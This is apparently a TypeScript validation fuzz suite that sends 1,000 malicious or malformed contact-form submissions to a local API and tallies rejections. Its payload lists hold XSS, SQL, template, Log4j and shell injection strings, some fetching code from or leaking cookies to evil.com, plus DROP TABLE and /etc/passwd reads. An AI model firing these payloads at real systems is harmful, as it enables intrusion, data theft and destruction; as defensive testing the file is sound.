import http from 'http';
import jwt from 'jsonwebtoken';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
dotenv.config({ path: path.join(__dirname, '../../.env') });

const API_HOST = 'localhost';
const API_PORT = 5001;
const API_PATH = '/api/inquiries/contact';
const JWT_SECRET = process.env.JWT_SECRET || 'your_jwt_secret_here';

// Helper to create a valid CAPTCHA token and answer so requests test field validation
function getValidCaptcha() {
    const answer = 'VAL123';
    const token = jwt.sign({ captcha: answer }, JWT_SECRET, { expiresIn: '15m' });
    return { captchaToken: token, captchaAnswer: answer };
}

interface TestPayload {
    id: number;
    category: string;
    description: string;
    body: Record<string, any>;
}

// Low-level HTTP requester with timeout and keep-alive
function sendRequest(payload: Record<string, any>): Promise<{ status: number; body: string; timeMs: number }> {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify(payload);
        const startTime = Date.now();

        const req = http.request({
            hostname: API_HOST,
            port: API_PORT,
            path: API_PATH,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data),
                'Origin': 'http://localhost:1002',
                'x-skip-ratelimit': 'true'
            }
        }, (res) => {
            let resBody = '';
            res.on('data', (chunk) => resBody += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode || 0,
                    body: resBody,
                    timeMs: Date.now() - startTime
                });
            });
        });

        req.on('error', (err) => reject(err));
        req.setTimeout(8000, () => {
            req.destroy();
            reject(new Error('Request timed out'));
        });

        req.write(data);
        req.end();
    });
}

// Baseline valid form submission
function getBase() {
    const captcha = getValidCaptcha();
    return {
        fullName: 'Dr. Ananya Sarma',
        email: 'ananya.sarma@gmail.com',
        phone: '9876543210',
        subject: 'General Inquiry Regarding B.Sc Nursing',
        message: 'Hello, I would like to inquire about the eligibility criteria and hostel facilities.',
        ...captcha
    };
}

// ----------------------------------------------------------------------------
// Generator: 1,000 Categorized Improper Payloads
// ----------------------------------------------------------------------------
export function generate1000ImproperPayloads(): TestPayload[] {
    const list: TestPayload[] = [];
    let id = 1;

    // ------------------------------------------------------------------------
    // 1. XSS & HTML/Script Injection (150 tests)
    // ------------------------------------------------------------------------
    const xssVectors = [
        '<script>alert(1)</script>',
        '"><script>alert("xss")</script>',
        '<script src="http://evil.com/x.js"></script>',
        '<script>document.location="http://evil.com/"+document.cookie</script>',
        '"><img src=x onerror=alert(1)>',
        '<img src=x onerror=alert("XSS")>',
        '<img src="javascript:alert(1)">',
        '"><svg onload=alert(1)>',
        '<svg/onload=alert("xss")>',
        '<svg onload=fetch("http://evil.com")>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<iframe src="http://evil.com"></iframe>',
        '<a href="javascript:alert(1)">Click</a>',
        'javascript:alert(1)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox("xss")',
        '<details open ontoggle=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<select onchange=alert(1)><option>1</select>',
        '<textarea oninput=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<isindex action=javascript:alert(1) type=image>',
        '<script/x>alert(1)</script>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '<SCRIPT/SRC="data:text/javascript,alert(1)">',
        '<sCrIpt>alert(1)</sCrIpt>',
        '<IMG SRC=X ONERROR=ALERT(1)>',
        '＜script＞alert(1)＜/script＞', // Fullwidth Unicode bypass attempt
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        '<b onmouseover=alert(1)>Hover</b>',
        '<div style="background-image: url(javascript:alert(1))">',
        '<!--<script>alert(1)</script>-->',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">'
    ];

    for (let i = 0; i < 150; i++) {
        const payload = xssVectors[i % xssVectors.length] + (i >= xssVectors.length ? ` /*${i}*/` : '');
        const targetField = ['fullName', 'subject', 'message', 'phone', 'email'][i % 5];
        const base = getBase();
        (base as any)[targetField] = payload;
        list.push({
            id: id++,
            category: 'XSS & HTML Injection',
            description: `XSS injection (${targetField}): ${payload.slice(0, 35)}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 2. SQL Injection (SQLi) (100 tests)
    // ------------------------------------------------------------------------
    const sqliVectors = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' OR ''='",
        "\" OR \"\"=\"",
        "') OR ('1'='1",
        "' UNION SELECT null, null, null, null, null, null, null--",
        "' UNION ALL SELECT 1,2,3,4,5,6,7#",
        "'; DROP TABLE contact_inquiries;--",
        "'; DELETE FROM admins;--",
        "'; UPDATE admins SET role='superadmin';--",
        "' WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
        "1' ORDER BY 1--+",
        "1' ORDER BY 100--+",
        "'; EXEC xp_cmdshell('dir');--",
        "' OR 1=1 LIMIT 1--",
        "' AND 1=0 UNION ALL SELECT @@version, user()--",
        "' OR 'a'='a' /* comment */",
        "admin' /*",
        "' OR EXISTS(SELECT * FROM admins WHERE username='admin')--",
        "1; SELECT pg_sleep(5);",
        "1' AND 5=5 AND 'a'='a",
        "' HAVING 1=1--"
    ];

    for (let i = 0; i < 100; i++) {
        const payload = sqliVectors[i % sqliVectors.length] + (i >= sqliVectors.length ? ` /*sqli_${i}*/` : '');
        const targetField = ['fullName', 'phone', 'subject', 'message'][i % 4];
        const base = getBase();
        (base as any)[targetField] = payload;
        list.push({
            id: id++,
            category: 'SQL Injection',
            description: `SQLi attempt in ${targetField}: ${payload.slice(0, 35)}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 3. Template & Expression Injection (SSTI / Log4j) (100 tests)
    // ------------------------------------------------------------------------
    const sstiVectors = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '*{7*7}',
        '{{config.items()}}',
        '{{self}}',
        '{{constructor.constructor("alert(1)")()}}',
        '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
        '${jndi:ldap://evil.com/a}',
        '${jndi:dns://evil.com}',
        '${lower:jndi}:${lower:ldap}',
        '${env:PATH}',
        '${sys:user.home}',
        '{fgjhghkj}', // Auditor exact finding payload
        '{{fgjhghkj}}',
        '${fgjhghkj}',
        '#{fgjhghkj}',
        '{template_test}',
        '{{7*\'7\'}}',
        '${@java.lang.Runtime@getRuntime().exec("calc")}',
        '#set($x=7*7)${x}',
        '[[${7*7}]]',
        '{~7*7~}'
    ];

    for (let i = 0; i < 100; i++) {
        const payload = sstiVectors[i % sstiVectors.length] + (i >= sstiVectors.length ? `_${i}` : '');
        const targetField = ['fullName', 'subject', 'message'][i % 3];
        const base = getBase();
        (base as any)[targetField] = payload;
        list.push({
            id: id++,
            category: 'Template Injection (SSTI)',
            description: `SSTI attempt in ${targetField}: ${payload.slice(0, 35)}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 4. Command Injection & Path Traversal (75 tests)
    // ------------------------------------------------------------------------
    const cmdVectors = [
        '; ls -la;',
        '| cat /etc/passwd',
        '& id &',
        '&& whoami &&',
        '$(whoami)',
        '`id`',
        '; ping -c 3 127.0.0.1;',
        '| dir',
        '& net user',
        '../../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\cmd.exe',
        '....//....//....//etc/shadow',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '/etc/passwd\\0.jpg',
        '; curl http://evil.com/shell.sh | sh;',
        '| wget http://evil.com/malware',
        '${IFS}cat${IFS}/etc/passwd',
        '| nslookup evil.com'
    ];

    for (let i = 0; i < 75; i++) {
        const payload = cmdVectors[i % cmdVectors.length] + (i >= cmdVectors.length ? `_${i}` : '');
        const targetField = ['fullName', 'subject', 'message'][i % 3];
        const base = getBase();
        (base as any)[targetField] = payload;
        list.push({
            id: id++,
            category: 'Command & Path Traversal',
            description: `Command/Traversal in ${targetField}: ${payload.slice(0, 35)}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 5. Header, CRLF & Null Byte Injection (75 tests)
    // ------------------------------------------------------------------------
    const crlfVectors = [
        'Dr. Test\r\nBcc: evil@attacker.com',
        'Dr. Test\r\nSubject: Injected Spam',
        'Dr. Test\nCc: victim@domain.com',
        'Dr. Test\r\nSet-Cookie: session=hijacked; Path=/',
        'Dr. Test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK',
        'Dr. Test\0NullByteName',
        'ananya.sarma@gmail.com\r\nBcc:spam@evil.com',
        '9876543210\r\nInjectedHeader',
        '9876543210\0',
        'Dr. Test\r\n\r\n<script>alert(1)</script>',
        'Dr. Test\x00Admin',
        'Dr. Test\x1B[31mRedText',
        'Dr. Test\rInjectedCarriage',
        'Dr. Test\tTabInjected'
    ];

    for (let i = 0; i < 75; i++) {
        const payload = crlfVectors[i % crlfVectors.length] + (i >= crlfVectors.length ? `_${i}` : '');
        const targetField = ['fullName', 'phone', 'email'][i % 3];
        const base = getBase();
        (base as any)[targetField] = payload;
        list.push({
            id: id++,
            category: 'CRLF & Null Byte Injection',
            description: `CRLF/Control char in ${targetField}: ${payload.slice(0, 35).replace(/[\r\n]/g, '\\n')}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 6. Name & Subject Keyboard Mash / Gibberish (100 tests)
    // ------------------------------------------------------------------------
    const gibberishNames = [
        'fgjhghkj', // Auditor exact payload
        'asdfghjkl',
        'bcdfghjklmnp',
        'qwrtpsdfghjk',
        'zxcvbnmzxcvb',
        'jkll',
        'mnbvcxzlkjhg',
        'aaaaa',
        'zzzzz',
        '11111',
        'John123',
        'Dr. 99',
        'User_Name',
        'Test@User',
        'Name#Hash',
        'A',
        'B',
        'X Y Z',
        'Nvwlshrk',
        'Qwrty Psdfgh'
    ];

    for (let i = 0; i < 100; i++) {
        const payload = gibberishNames[i % gibberishNames.length] + (i >= gibberishNames.length ? `${i}` : '');
        const targetField = i % 2 === 0 ? 'fullName' : 'subject';
        const base = getBase();
        (base as any)[targetField] = payload;
        list.push({
            id: id++,
            category: 'Gibberish & Keyboard Mash',
            description: `Keyboard mash / invalid ${targetField}: ${payload.slice(0, 35)}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 7. Malformed Phone Numbers (100 tests)
    // ------------------------------------------------------------------------
    const badPhones = [
        '564656454', // Auditor exact 9-digit payload
        '123',
        '98765',
        '12345678',
        '123456789',
        '98765432101234567', // 17 digits (too long)
        '98765432101234567890',
        'phone12345',
        'abcdefghij',
        '+91abcdefghij',
        '0123456789', // Invalid start digit 0
        '1234567890', // Invalid start digit 1
        '2345678901', // Invalid start digit 2
        '3456789012', // Invalid start digit 3
        '4567890123', // Invalid start digit 4
        '5555555555', // Invalid start digit 5
        '9999999999', // Dummy repetitive digits
        '8888888888',
        '7777777777',
        '6666666666',
        '+919999999999',
        '+001234567890',
        '+91 00000 00000',
        '98765-43210#123'
    ];

    for (let i = 0; i < 100; i++) {
        const payload = badPhones[i % badPhones.length] + (i >= badPhones.length ? `${i}` : '');
        const base = getBase();
        base.phone = payload;
        list.push({
            id: id++,
            category: 'Malformed Phone Numbers',
            description: `Invalid phone format: ${payload}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 8. Malformed & Fake Emails (100 tests)
    // ------------------------------------------------------------------------
    const badEmails = [
        'plainaddress',
        '@domain.com',
        'user@',
        '@',
        'user@domain@another.com',
        'user..name@gmail.com',
        'user@gmail..com',
        '.user@gmail.com',
        'user.@gmail.com',
        'test@1234.com', // purely numeric domain
        'user@99999.org',
        'user@domain.c', // 1-char TLD
        'user@domain.123', // numeric TLD
        'user@mailinator.com', // Disposable domain
        'user@10minutemail.com',
        'user@tempmail.com',
        'user@guerrillamail.com',
        'user@trashmail.com',
        'user@thisisafakedonotdeliver999999.com', // Non-deliverable / non-existent MX
        'user name@gmail.com',
        'user<tag>@gmail.com',
        'user"quote"@gmail.com'
    ];

    for (let i = 0; i < 100; i++) {
        const payload = badEmails[i % badEmails.length] + (i >= badEmails.length ? `_${i}` : '');
        const base = getBase();
        base.email = payload;
        list.push({
            id: id++,
            category: 'Malformed & Fake Emails',
            description: `Invalid email format: ${payload.slice(0, 35)}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 9. Type Confusion & Malformed JSON (100 tests)
    // ------------------------------------------------------------------------
    const typeConfusionBodies: Array<{ field: string; val: any; desc: string }> = [
        { field: 'fullName', val: { '$gt': '' }, desc: 'Object injection in fullName' },
        { field: 'fullName', val: ['Dr. John', 'Doe'], desc: 'Array injection in fullName' },
        { field: 'fullName', val: 12345, desc: 'Integer in fullName' },
        { field: 'fullName', val: true, desc: 'Boolean true in fullName' },
        { field: 'email', val: { '$ne': null }, desc: 'Object in email' },
        { field: 'email', val: ['admin@ain.edu.in'], desc: 'Array in email' },
        { field: 'email', val: false, desc: 'Boolean in email' },
        { field: 'phone', val: { 'number': '9876543210' }, desc: 'Object in phone' },
        { field: 'phone', val: [9876543210], desc: 'Array in phone' },
        { field: 'subject', val: { '$regex': '.*' }, desc: 'Regex object in subject' },
        { field: 'subject', val: 9999, desc: 'Number in subject' },
        { field: 'message', val: { 'text': 'nested message' }, desc: 'Object in message' },
        { field: 'message', val: [1, 2, 3], desc: 'Array in message' },
        { field: '__proto__', val: { 'isAdmin': true }, desc: 'Prototype pollution attempt' },
        { field: 'constructor', val: { 'prototype': { 'polluted': true } }, desc: 'Constructor prototype pollution' }
    ];

    for (let i = 0; i < 100; i++) {
        const item = typeConfusionBodies[i % typeConfusionBodies.length];
        const base = getBase();
        Object.defineProperty(base, item.field, { value: item.val, enumerable: true, configurable: true, writable: true });
        list.push({
            id: id++,
            category: 'Type Confusion & Malformed JSON',
            description: `Type violation (#${i + 1}): ${item.desc}`,
            body: base
        });
    }

    // ------------------------------------------------------------------------
    // 10. Boundary & Length Violations (100 tests)
    // ------------------------------------------------------------------------
    for (let i = 0; i < 100; i++) {
        const base = getBase();
        let desc = '';

        if (i < 10) {
            // Missing required fields
            const removeField = ['fullName', 'email', 'subject', 'message'][i % 4];
            delete (base as any)[removeField];
            desc = `Missing required field: ${removeField}`;
        } else if (i < 25) {
            // Empty strings
            const emptyField = ['fullName', 'email', 'subject', 'message'][i % 4];
            (base as any)[emptyField] = '';
            desc = `Empty string on required field: ${emptyField}`;
        } else if (i < 40) {
            // Whitespace only
            const wsField = ['fullName', 'email', 'subject', 'message'][i % 4];
            (base as any)[wsField] = '     \t\t   \n  ';
            desc = `Whitespace-only on required field: ${wsField}`;
        } else if (i < 60) {
            // Oversized message (Buffer overflow / DoS: 5,000 to 20,000 characters)
            base.message = 'A'.repeat(5000 + (i * 250));
            desc = `Oversized message (${base.message.length} chars)`;
        } else if (i < 80) {
            // Oversized fullName (100 to 500 characters)
            base.fullName = 'Dr. ' + 'VeryLongName'.repeat(10 + i);
            desc = `Oversized fullName (${base.fullName.length} chars)`;
        } else {
            // Oversized subject (200 to 800 characters)
            base.subject = 'Important Inquiry: ' + 'Details'.repeat(30 + i);
            desc = `Oversized subject (${base.subject.length} chars)`;
        }

        list.push({
            id: id++,
            category: 'Boundary & Length Violations',
            description: desc,
            body: base
        });
    }

    return list;
}

// ----------------------------------------------------------------------------
// Test Runner
// ----------------------------------------------------------------------------
async function runFuzzTest() {
    console.log('='.repeat(78));
    console.log('🛡️  OWASP DATA VALIDATION (CWE-20) 1,000-REQUEST STRESS & FUZZ SUITE');
    console.log('   Target: http://' + API_HOST + ':' + API_PORT + API_PATH);
    console.log('='.repeat(78));

    const payloads = generate1000ImproperPayloads();
    console.log(`Generated ${payloads.length} improper payloads across 10 security categories.\n`);

    const stats: Record<string, { total: number; rejected400: number; accepted200: number; serverError500: number; other: number }> = {};
    const failures: Array<{ id: number; category: string; description: string; status: number; body: string }> = [];

    const CONCURRENCY = 15; // Parallel workers to ensure fast execution without OS socket exhaustion
    let currentIndex = 0;
    const startTime = Date.now();

    async function worker(workerId: number) {
        while (currentIndex < payloads.length) {
            const index = currentIndex++;
            const item = payloads[index];

            if (!stats[item.category]) {
                stats[item.category] = { total: 0, rejected400: 0, accepted200: 0, serverError500: 0, other: 0 };
            }
            stats[item.category].total++;

            try {
                const res = await sendRequest(item.body);

                if (res.status === 400 || res.status === 401 || res.status === 422) {
                    // Correctly rejected by validation
                    stats[item.category].rejected400++;
                } else if (res.status === 200 || res.status === 201) {
                    // CRITICAL FAIL: Malicious/improper payload was accepted!
                    stats[item.category].accepted200++;
                    failures.push({
                        id: item.id,
                        category: item.category,
                        description: item.description,
                        status: res.status,
                        body: res.body.slice(0, 100)
                    });
                } else if (res.status >= 500) {
                    // CRITICAL FAIL: Server crash / unhandled SQL or syntax exception
                    stats[item.category].serverError500++;
                    failures.push({
                        id: item.id,
                        category: item.category,
                        description: item.description,
                        status: res.status,
                        body: res.body.slice(0, 100)
                    });
                } else {
                    stats[item.category].other++;
                }
            } catch (err: any) {
                // Request timeout or connection failure
                stats[item.category].serverError500++;
                failures.push({
                    id: item.id,
                    category: item.category,
                    description: item.description,
                    status: 599,
                    body: err.message
                });
            }

            if ((index + 1) % 100 === 0 || index + 1 === payloads.length) {
                process.stdout.write(`⏳ Completed ${index + 1} / ${payloads.length} requests...\r`);
            }
        }
    }

    const workers = Array.from({ length: CONCURRENCY }, (_, i) => worker(i));
    await Promise.all(workers);

    const totalDuration = ((Date.now() - startTime) / 1000).toFixed(2);
    console.log(`\n\n✅ Executed all ${payloads.length} requests in ${totalDuration}s.\n`);

    // Results Table
    console.log('┌' + '─'.repeat(36) + '┬' + '─'.repeat(10) + '┬' + '─'.repeat(14) + '┬' + '─'.repeat(14) + '┬' + '─'.repeat(10) + '┐');
    console.log(`│ ${'Category'.padEnd(34)} │ ${'Total'.padStart(8)} │ ${'Rejected(400)'.padStart(12)} │ ${'Accepted(200)'.padStart(12)} │ ${'Errors(500)'.padStart(8)} │`);
    console.log('├' + '─'.repeat(36) + '┼' + '─'.repeat(10) + '┼' + '─'.repeat(14) + '┼' + '─'.repeat(14) + '┼' + '─'.repeat(10) + '┤');

    let totalAll = 0;
    let totalRejected = 0;
    let totalAccepted = 0;
    let total500 = 0;

    for (const [cat, s] of Object.entries(stats)) {
        totalAll += s.total;
        totalRejected += s.rejected400;
        totalAccepted += s.accepted200;
        total500 += s.serverError500;

        const catCol = cat.padEnd(34);
        const totalCol = s.total.toString().padStart(8);
        const rejCol = s.rejected400.toString().padStart(12);
        const accCol = s.accepted200.toString().padStart(12);
        const errCol = s.serverError500.toString().padStart(8);

        console.log(`│ ${catCol} │ ${totalCol} │ ${rejCol} │ ${accCol} │ ${errCol} │`);
    }

    console.log('├' + '─'.repeat(36) + '┼' + '─'.repeat(10) + '┼' + '─'.repeat(14) + '┼' + '─'.repeat(14) + '┼' + '─'.repeat(10) + '┤');
    console.log(`│ ${'OVERALL TOTALS'.padEnd(34)} │ ${totalAll.toString().padStart(8)} │ ${totalRejected.toString().padStart(12)} │ ${totalAccepted.toString().padStart(12)} │ ${total500.toString().padStart(8)} │`);
    console.log('└' + '─'.repeat(36) + '┴' + '─'.repeat(10) + '┴' + '─'.repeat(14) + '┴' + '─'.repeat(14) + '┴' + '─'.repeat(10) + '┘');

    console.log(`\n📊 SUMMARY:`);
    console.log(`- Total Requests Tested: ${totalAll}`);
    console.log(`- Actively Rejected (HTTP 400 Bad Request): ${totalRejected} (${((totalRejected / totalAll) * 100).toFixed(1)}%)`);
    console.log(`- Improper Payloads Accepted (HTTP 200/201): ${totalAccepted}`);
    console.log(`- Server Crashes (HTTP 500): ${total500}`);

    if (failures.length > 0) {
        console.error(`\n❌ FAILURES DETECTED (${failures.length}):`);
        failures.forEach(f => {
            console.error(`  [#${f.id}] [${f.category}] status=${f.status}: ${f.description}`);
        });
        process.exit(1);
    } else {
        console.log(`\n🎉 PERFECT SCORE! 1000/1000 improper requests were successfully intercepted and rejected.`);
        console.log(`🔒 CWE-20 (Improper Input Validation) is 100% Resolved.`);
        process.exit(0);
    }
}

runFuzzTest();
